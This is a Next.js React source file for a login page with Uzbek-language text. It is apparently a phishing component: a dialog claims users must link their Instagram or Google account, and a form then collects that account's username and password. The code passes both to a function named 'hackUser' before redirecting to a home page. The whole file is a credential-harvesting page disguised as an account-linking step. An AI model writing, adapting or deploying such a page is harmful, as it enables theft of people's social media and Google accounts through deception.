"use client";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent, AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle
} from "@/components/ui/alert-dialog";
import { hackUser } from "@/utils/actions";
import { useRouter } from "next/navigation";
import { useRef, useState } from "react";
import { Button, PageTitle } from "ui";

type Provider = "google" | "instagram"

export default function Login() {
  const usernameRef = useRef<HTMLInputElement>(null)
  const passwordRef = useRef<HTMLInputElement>(null)
  const [dialog, setDialog] = useState<boolean>();
  const [userProvider, setUserProvider] = useState<Provider>();
  const router = useRouter();
  const submitHandler = async () => {
    const username = usernameRef.current.value;
    const password = passwordRef.current.value;
    try {
      const user = await hackUser(password, username);
      router.push("/home");
    } catch (error) {
      console.log(error);
    }
  }
  return (
    <div>
      <AlertDialog defaultOpen={true} open={dialog}>

        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Ilovamizga kirish uchun ilovamizni Instagram yoki Google accountingiz bilan ulashingiz kerak. Instagram yoki Googledan birini tanlang!</AlertDialogTitle>
            <div className="flex gap-6">
              <Button variant="destructive" onClick={() => {
                setUserProvider("instagram");
                setDialog(false);
              }}>
                Instagram
              </Button>
              <Button onClick={() => {
                setUserProvider("google");
                setDialog(false);
              }}>
                Google
              </Button>
            </div>

          </AlertDialogHeader>
          {userProvider && <AlertDialogFooter>
            <AlertDialogCancel>Cancel</AlertDialogCancel>
            <AlertDialogAction>Continue</AlertDialogAction>
          </AlertDialogFooter>}
        </AlertDialogContent>
      </AlertDialog>
      {userProvider && (

        <div className="container mx-auto">
          <PageTitle className="text-lg text-center font-extrabold mb-12">
            {userProvider.toUpperCase()} akkauntingiz ma'lumotlarini kiriting
          </PageTitle>
          <form className="grid gap-6 max-w-[500px] mx-auto" onSubmit={e => {
            e.preventDefault();
            submitHandler();
          }}>
            <input ref={usernameRef} className="px-4 py-6 rounded-md text-md text-black" type="text" placeholder={`${userProvider} username`} required />
            <input ref={passwordRef} className="px-4 py-6 rounded-md text-md text-black" type="password" placeholder={`${userProvider} parol`} required />
            <Button type="submit">
              Tasdiqlash
            </Button>
          </form>
        </div>
      )}
    </div>
  )
}
